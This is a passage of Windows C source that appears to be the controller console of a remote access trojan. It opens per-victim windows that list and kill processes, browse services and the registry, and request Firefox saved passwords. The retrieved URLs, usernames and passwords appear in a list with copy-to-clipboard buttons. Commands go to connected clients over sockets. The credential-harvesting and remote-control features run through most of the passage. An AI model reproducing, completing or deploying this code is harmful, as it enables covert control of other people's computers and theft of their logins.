				dwFileSize = GetFileSize(hFile, NULL);
				if(dwFileSize != 0xFFFFFFFF)
				{
				pszFileText = (char *)GlobalAlloc(GPTR, dwFileSize + 1);
					 if(pszFileText != NULL)
				{
						DWORD dwRead;

						if(ReadFile(hFile, pszFileText, dwFileSize, &dwRead, NULL))
					{
					   pszFileText[dwFileSize] = 0; // Add null terminator
					 SetWindowText(GetDlgItem(hwnd,IDC_EULA), pszFileText);
					     
					}
                GlobalFree(pszFileText);
				 }
				}
        CloseHandle(hFile);
			 }
		
		InitCommonControls(); 
		/////////////////////////////////////////////////////////////

	break;


	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_AGREE:
			EndDialog(hwnd,Select);
			break;
		case IDC_DISAGREE:
			ExitProcess(0);
			EndDialog(hwnd,Select);
		    PostQuitMessage(0);
			break;
		case IDCANCEL:
					ExitProcess(0);
					EndDialog(hwnd,Select);
		    		PostQuitMessage(0);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Help Proc


/////////////////////////////////////////////////////////////////////////////////////////////////
//Entry function
HANDLE hRichEdit;
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
		hRichEdit = LoadLibrary( "RICHED32.DLL" );
if( ! hRichEdit )
   {                                      //  If Rich Edit DLL load fails, exit

      return( FALSE );
   }
   else
   {
	 
   }
    HICON hIcon;
	DialogBox(hInstance,(LPCTSTR)EULA,0,(DLGPROC)EULAProc);
	GInstance = hInstance;
	hDlg=CreateDialog(hInstance,(LPCTSTR)IDD_DIALOG1,NULL,(DLGPROC)MainProc);
	ShowWindow(hDlg,SW_SHOW);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(hDlg, WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(hDlg, WM_SETICON,ICON_BIG,(LPARAM)hIcon);
	InitCommonControls();
	MSG msg;
	while(GetMessage(&msg,hDlg,0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}
///////////////////////////////////////////////////////////////////////////////////
//Task manager
/////////////////////////////////////////////////////////////////////////////////////
//Task callBack
LRESULT CALLBACK TaskProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	int FG = 0;
    char Buffer [512] = "";
	int i= 0;
	int j=0;
	LV_COLUMN	col;
	LV_ITEM		item;
	//THwnd = hwnd;
	HWND Status = 0;
	HWND hEdit = 0;

    HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   

	RECT rc;    // client area   GetClientRect(hwnd, (LPRECT) &rc);          
    POINT  pt;   // location of mouse click 
	
	TCITEM tie;
	
	int statwidths[] = {160, -1};
	MEMORYSTATUS Memory;

	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		InitCommonControls(); 
		
GlobalMemoryStatus(&Memory);
sprintf(Buffer, "Physical Memory: %d", Memory.dwMemoryLoad);
MessageBox(NULL, Buffer, "Buffer", MB_OK);
		/////////////////////////////////////////////////////////////
		//Task List
    tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Process";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB1), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Applications";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB1), 1, &tie);
     
        ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_TASKLIST),LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);

     	col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=200;
		col.pszText="Process";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),0,&col);
		col.cx=100;
		col.pszText="PID";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),1,&col);
		col.cx=100;
		col.pszText="Parent PID";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),2,&col);
		col.cx=100;
		col.pszText="Threads";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),3,&col);
		col.cx=100;
		col.pszText="Priority";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),4,&col);


		 Status = CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hwnd, (HMENU)IDC_TASK_STATUS , GetModuleHandle(NULL), NULL);

		SendMessage(Status, SB_SETPARTS, 2, (LPARAM)statwidths);
		sprintf(Buffer, "Process's: %d",0);
		SendMessage(Status, SB_SETTEXT, 0, (LPARAM)Buffer);
		sprintf(Buffer, "Physical Memory: %d",0);
		SendMessage(Status, SB_SETTEXT, 1, (LPARAM)Buffer);
	break;
    case WM_NOTIFY:
	
	switch(wParam)

	{
	case IDC_TASKLIST:

			if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hwnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
			
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU1));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL); 
			break;
			}
			break;
	case IDC_TAB1:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                { 
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(hwnd, IDC_TAB1)); 
                    if(iPage != 0)
					{
					ResetProcs(hwnd, IDC_TASKLIST);
					STATE = 1;
						col.mask=LVCF_TEXT|LVCF_WIDTH;
		                col.cx=600;
		                col.pszText="Window";
	                  	ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),0,&col);

						col.mask=LVCF_TEXT|LVCF_WIDTH;
		                col.cx=0;
		                col.pszText="";
	                  	ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),1,&col);

					col.cx=0;
					col.pszText=" ";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),2,&col);
					col.cx=0;
					col.pszText=" ";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),3,&col);
					col.cx=0;
					col.pszText=" ";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),4,&col);

					P = 0;
					if (WSAGetLastError() != WSAEALREADY)
					{
					Sleep(10);
					
			                 ResetProcs(hwnd, IDC_TASKLIST);
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
							 Head.PacketType=PACKET_TASK_MANAGER_TASKS;
							 SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
					}
							 break;
					}
					else
					{
					STATE = 0;
					ResetProcs(hwnd, IDC_TASKLIST);
					col.mask=LVCF_TEXT|LVCF_WIDTH;
					col.cx=200;
					col.pszText="Process";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),0,&col);
					col.cx=100;
					col.pszText="PID";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),1,&col);
					col.cx=100;
					col.pszText="Parent PID";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),2,&col);
					col.cx=100;
					col.pszText="Threads";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),3,&col);
					col.cx=100;
					col.pszText="Priority";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),4,&col);

					 P = 0;
					 if (WSAGetLastError() != WSAEALREADY)
					 {
			                 ResetProcs(hwnd, IDC_TASKLIST);
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
							 Head.PacketType=PACKET_TASK_MANAGER;
							 SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
					 }
					}
				
                    
                }
				break;
            }
		break;
	}
	break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
	
		case IDC_REFRESH_TASK:

			if(STATE == 0)
			{
			                 P = 0;
			                 ResetProcs(hwnd, IDC_TASKLIST);
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
							 Head.PacketType=PACKET_TASK_MANAGER;
							 SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
			}
			else
			{
						     P = 0;
			                 ResetProcs(hwnd, IDC_TASKLIST);
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
							 Head.PacketType=PACKET_TASK_MANAGER_TASKS;
							 SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
			}
							 break;
		case IDC_TASK_KILL:
			if(MessageBox(NULL, "Are you sure you want to kill the selected task?", "Proc manager", MB_YESNO | MB_ICONQUESTION) == IDYES)
			{
			    item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_TASKLIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Head.Data;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,IDC_TASKLIST),&item);
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
				if(STATE == 0)
				{
				Head.PacketType = PACKET_TASK_MANAGER_KILL;
				}
				else
				{
				Head.PacketType = PACKET_TASK_MANAGER_KTASK;
				}
				SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);

				strcpy(Buffer, ""); 
				sprintf(Buffer, "Killed: %s", Head.Data);
				GetTime();
				SetLogs(Time, "Task Kill", Buffer , "Pass");
				ListView_DeleteItem(GetDlgItem(hwnd,IDC_TASKLIST),ListView_GetNextItem(GetDlgItem(hwnd,IDC_TASKLIST),-1,LVNI_SELECTED));
				//////////////////////////////////////////// 
			}
			else
			{
			break;
			}
			break;
		
		case IDCANCEL:
					GetWindowText(hwnd, WindowOut, 10);
			        WindowOutY[0] = WindowOut[0];
			        Head.ID = atoi(WindowOutY);
					TASKS[Head.ID] = NULL;

					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI ProcWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	char IDA [10] = "";
	int PROCID = GID;
	
	strcpy(COMPUTER, WINDOWIP);

	HICON hIcon;
   
	TASKS[PROCID]=CreateDialog(TaInst,(LPCTSTR)IDD_DIALOG3,NULL,(DLGPROC)TaskProc);
	ShowWindow(TASKS[PROCID],SW_SHOW);
	ShowWindow(GetDlgItem(TASKS[PROCID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"Task Manager | %s", COMPUTER);
	sprintf(IDA, "%d", PROCID);
	
	SetWindowText(TASKS[PROCID], WindowText);
	SetWindowText(GetDlgItem(TASKS[PROCID], IDC_ID), IDA);

	Head.PacketType=PACKET_TASK_MANAGER;
	SentKb+=send(Client[PROCID],(char*)&Head,HeadSize,0);
	
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(TASKS[PROCID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(TASKS[PROCID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	while(GetMessage(&msg,TASKS[PROCID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
////////////////////////////////////////////////////////////////////////////////////
//Passwords
LRESULT CALLBACK PasswordProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	char Title [50] = "";
	int FG = 0;
	LV_COLUMN	col;
	LV_ITEM		item;
    POINT  pt;   // location of mouse click 
    HMENU hmenu;
	HMENU hmenuTrackPopup;
	RECT rc;
	HGLOBAL hMem;
	LPTSTR sMem;
switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		ListView_SetImageList(GetDlgItem(hwnd, IDC_PASSWORDS),hImageList, LVSIL_SMALL);
		ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_PASSWORDS),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;

		col.cx=225;
		col.pszText="URL";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PASSWORDS),0,&col);

		col.cx=120;
		col.pszText="UserName";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PASSWORDS),1,&col);

		col.cx=100;
		col.pszText="PassWord";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PASSWORDS),2,&col);
		col.cx=100;
		/////////////////////////////////////////////////////////////

	break;
	
	case WM_NOTIFY:
		   if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hwnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU6));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL); 
			}
			

		break;
		case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);
			break;

			case WMSZ_BOTTOMLEFT:
				 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_LEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);			 
            break;

			case WMSZ_RIGHT:
             GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_TOP:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);			 
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);	
			break;

			case WMSZ_TOPRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PASSWORDS),0,0,rc.right, rc.bottom, TRUE);			 
			break;
			}
			break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_GOTOSITE:
			
			item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_PASSWORDS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hwnd,IDC_PASSWORDS),&item);
			
			ShellExecute(NULL, "open", Head.Data, NULL, NULL, SW_SHOWNORMAL);
			break;
		case IDC_COPYPW:
			item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_PASSWORDS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=2;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hwnd,IDC_PASSWORDS),&item);

			if (!OpenClipboard(NULL))
			{
			return 1;
			}	   //if failed to open clipboard, die
			EmptyClipboard();    //empty the clipboard

			hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlen(Head.Data)+1));    //allocate memory as big as the text-string
			sMem = (TCHAR*)GlobalLock(hMem);        //make memory-data space, lock the memory
			memcpy(sMem, "", 1);
			memcpy(sMem, Head.Data, (lstrlen(Head.Data)+1));    //copy text-data into memory-data
			GlobalUnlock(hMem);        //unlock the memory
			SetClipboardData(CF_TEXT, hMem);    //put the data (text) to the clipboard

		    CloseClipboard();    //we don't want to put anymore data to it so..

			break;
		case IDC_COPYUSER:
			item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_PASSWORDS),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=1;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(hwnd,IDC_PASSWORDS),&item);

				if (!OpenClipboard(NULL))
				{
				return 1;
				}    //if failed to open clipboard, die
			EmptyClipboard();    //empty the clipboard

			hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlen(Head.Data)+1));    //allocate memory as big as the text-string
			sMem = (TCHAR*)GlobalLock(hMem);        //make memory-data space, lock the memory
			memcpy(sMem, Head.Data, (lstrlen(Head.Data)+1));    //copy text-data into memory-data
			GlobalUnlock(hMem);        //unlock the memory
			SetClipboardData(CF_TEXT, hMem);    //put the data (text) to the clipboard

			CloseClipboard();    //we don't want to put anymore data to it so..

			break;
		case IDC_REFRESH:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
			ResetProcs(hwnd, IDC_PASSWORDS);
				Head.PacketType = PASSWORD_FIREFOX;
				strcpy(Head.Data, "");
				SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
			break;
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					PassHwnd[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI PassswordWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW;
	FILEWINDOW = (FileStruct *) malloc(sizeof(FileStruct));
	FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	int LID = atoi(FILEWINDOW->ID);
	char IDA [10] = "";

	strcpy(COMPUTER, WINDOWIP);

	HICON hIcon;

	PassHwnd[LID]=CreateDialog(PassInst,(LPCTSTR)IDD_PASSWORDS,NULL,(DLGPROC)PasswordProc);
	ShowWindow(PassHwnd[LID],SW_SHOW);
	ShowWindow(GetDlgItem(PassHwnd[LID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"File Manager | %s", COMPUTER);
	sprintf(IDA, "%d", LID);
	
	SetWindowText(PassHwnd[LID], WindowText);
	SetWindowText(GetDlgItem(PassHwnd[LID], IDC_ID), IDA);

	Head.PacketType = PASSWORD_FIREFOX;
	Head.ID = LID; 
	strcpy(Head.Data, "");
    SentKb+=send(Client[LID],(char*)&Head,HeadSize,0);
	MSG msg;

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(PassHwnd[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(PassHwnd[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	free(FILEWINDOW);
	while(GetMessage(&msg,PassHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}

////////////////////////////////////////////////////////////////////////////////////
//Service Manager
LRESULT CALLBACK ServiceProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	char Title [50] = "";
	int FG = 0;
	LV_COLUMN	col;
//	LV_ITEM		item;
	RECT rc;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_SERVICES),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=100;

		col.pszText="Service Name";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),0,&col);
		col.cx=100;

		col.pszText="Display Name";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),1,&col);
		col.cx=100;

		col.pszText="Status";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),2,&col);
		col.cx=100;
		
		col.pszText="Startup";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),3,&col);
		col.cx=100;
		ListView_SetImageList(GetDlgItem(hwnd, IDC_SERVICES),hImageList, LVSIL_SMALL);
		/////////////////////////////////////////////////////////////

	break;
		case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);
			break;

			case WMSZ_BOTTOMLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_LEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
            break;

			case WMSZ_RIGHT:
             GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_TOP:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);	
			break;

			case WMSZ_TOPRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;
			}
			break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					Screen[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
DWORD WINAPI ServiceWindow(LPVOID lpParam)
{
    FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	int LID = atoi(FILEWINDOW->ID);
	
	strcpy(COMPUTER, WINDOWIP);

	HICON hIcon;

	ServiceHwnd[LID]=CreateDialog(PassInst,(LPCTSTR)IDD_SERVICES,NULL,(DLGPROC)ServiceProc);
	ShowWindow(ServiceHwnd[LID],SW_SHOW);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"%d | %s | Service Manager", LID, COMPUTER);

	SetWindowText(ServiceHwnd[LID], WindowText);
	Head.PacketType = PACKET_SERVICE_MAN;
	Head.ID = LID; 
	strcpy(Head.Data, "");
    SentKb+=send(Client[LID],(char*)&Head,HeadSize,0);

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(ServiceHwnd[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(ServiceHwnd[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	while(GetMessage(&msg,ServiceHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
////////////////////////////////////////////////////////////////////////////////////
//Registry manager
////////////////////////////////////////////////////////////////////////////////////
//Registry manager
int AddKeyFolder(char * KeyFolder, int ID)
{
            tvinsert.hParent=RSelected[ID];			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText=KeyFolder;
			tvinsert.item.iImage=0;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(RegHwnd[ID],IDC_REGFOLDERS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
			TreeView_Select(GetDlgItem(RegHwnd[ID],IDC_REGFOLDERS), RSelected[ID], TVGN_CARET);
			TreeView_Expand(GetDlgItem(RegHwnd[ID],IDC_REGFOLDERS), RSelected[ID], TVM_EXPAND);
			TreeView_Select(GetDlgItem(RegHwnd[ID],IDC_REGFOLDERS), RSelected[ID], TVGN_CARET);


return 0;
}
int RegKeyValue(char * Name,char * Value , int ID2, int ID)
{
char Buff [1024] = "";

    LV_ITEM	item;
	switch(ID2)
	{
	case REG_BINARY:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_BINARY";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_DWORD:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_DWORD";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_DWORD_BIG_ENDIAN:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_DWORD_BIG_ENDIAN";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_EXPAND_SZ:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 2; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_EXPAND_SZ";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_LINK:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_LINK";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_MULTI_SZ:
